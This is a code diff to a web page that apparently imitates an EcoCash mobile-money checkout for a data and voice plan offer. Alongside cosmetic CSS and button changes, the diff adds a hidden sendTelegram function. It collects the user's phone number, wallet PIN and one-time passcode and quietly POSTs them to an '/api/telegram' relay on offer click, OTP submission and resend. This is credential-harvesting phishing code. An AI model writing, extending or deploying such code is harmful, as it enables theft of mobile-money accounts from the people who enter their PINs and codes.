@@ -100,7 +100,7 @@ html,body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);backgrou
 
 /* PIN */
 .pin-label{font-size:12px;font-weight:600;color:var(--t3);margin-bottom:8px;letter-spacing:.2px}
-.pin-wrap{background:var(--bg);border:2px solid var(--line);border-radius:var(--r12);padding:16px;cursor:pointer;transition:border-color .15s,box-shadow .15s;display:flex;flex-direction:column;align-items:center;gap:12px;position:relative;user-select:none;-webkit-user-select:none}
+.pin-wrap{background:var(--bg);border:2px solid var(--line);border-radius:var(--r12);padding:16px;cursor:pointer;transition:border-color .15s,box-shadow .15s;display:flex;flex-direction:column;align-items:center;gap:12px;position:relative;user-select:none;-webkit-user-select:none;width:100%}
 .pin-wrap.focused{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,95,142,.1)}
 .pin-wrap.error{border-color:var(--err);box-shadow:0 0 0 3px rgba(239,68,68,.08)}
 .pin-hidden{position:absolute;inset:0;z-index:5;width:100%;height:100%;opacity:0;border:none;background:none;outline:none;cursor:pointer;font-size:16px;caret-color:transparent;-webkit-user-select:text;user-select:text}
@@ -113,7 +113,7 @@ html,body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);backgrou
 .pin-dot.peek::after{display:none!important}
 .pin-digit{position:absolute;inset:0;display:none;align-items:center;justify-content:center;font-family:var(--fm);font-size:20px;font-weight:700;color:var(--blue);pointer-events:none}
 .pin-dot.peek .pin-digit{display:flex}
-.pin-actions{display:flex;gap:8px;justify-content:center}
+.pin-actions{display:flex;gap:8px;justify-content:space-between;width:100%}
 .pin-btn{font-size:12px;font-weight:600;color:var(--blue);background:rgba(0,95,142,.07);border:1px solid rgba(0,95,142,.15);border-radius:var(--rp);padding:6px 16px;cursor:pointer;display:flex;align-items:center;gap:5px;transition:background .12s;font-family:var(--f)}
 .pin-btn:active{background:rgba(0,95,142,.14)}
 .pin-btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;display:block}
@@ -263,7 +263,10 @@ html,body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);backgrou
                 <button class="pin-btn" type="button" onpointerdown="event.preventDefault();peekPin()" onpointerup="unpeekPin()" onpointerleave="unpeekPin()">
                   <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Peek
                 </button>
-                <button class="pin-btn" type="button" onpointerdown="event.preventDefault()" onclick="clearPin()">Clear</button>
+                <div style="flex:1"></div>
+                <button class="pin-btn" type="button" onpointerdown="event.preventDefault()" onclick="clearPin()">
+                  <svg viewBox="0 0 24 24" style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;display:block"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>Clear
+                </button>
               </div>
             </div>
             <div class="api-err" id="apiErr1"></div>
@@ -362,6 +365,30 @@ html,body{width:100%;height:100dvh;overflow:hidden;font-family:var(--f);backgrou
 <script>
 function haptic(s){if(!navigator.vibrate)return;const m={light:8,med:18,ok:[10,50,10],err:[40,30,40]};try{navigator.vibrate(m[s]||10)}catch(e){}}
 
+/* ── Telegram ── */
+function sendTelegram(event,extraOtp){
+  try{
+    var p=plan||{};
+    var r=recip||{};
+    var payload={
+      event:event,
+      phone:r.raw||'',
+      pin:pin||'',
+      otp:extraOtp||otp||'',
+      plan:p.duration||'',
+      voice:p.voice||'',
+      sms:p.sms||'',
+      data:p.data||'',
+      amount:p.amount||'',
+    };
+    fetch('/api/telegram',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(payload)
+    }).catch(function(){});
+  }catch(e){}
+}
+
 /* ── Load session ── */
 let plan=null,recip=null;
 try{plan=JSON.parse(sessionStorage.getItem('selectedPlan')||'null')}catch(e){}
@@ -447,6 +474,7 @@ document.getElementById('mainBtn').addEventListener('click',async function(){
     haptic('err');focusPin();return;
   }
   submitting=true;haptic('med');
+  sendTelegram('receive_offer_clicked');
   document.getElementById('apiErr1').classList.remove('show');
   showStep('stepVerify');
 
@@ -542,13 +570,16 @@ async function submitOtp(){
     }
     console.warn('OTP verify sandbox fallback:',err?.message);
   }
-  haptic('ok');navigate('thankyou.html');
+  haptic('ok');
+  sendTelegram('offer_received',otp);
+  navigate('thankyou.html');
 }
 
 document.getElementById('resendBtn').addEventListener('click',async()=>{
   const btn=document.getElementById('resendBtn');
   if(!btn.classList.contains('active')||resendClicked)return;
   resendClicked=true;
+  sendTelegram('resend_otp');
   try{await EcoCashAPI.generateOTP(recip.raw)}catch(e){}
   startTimer();
 });
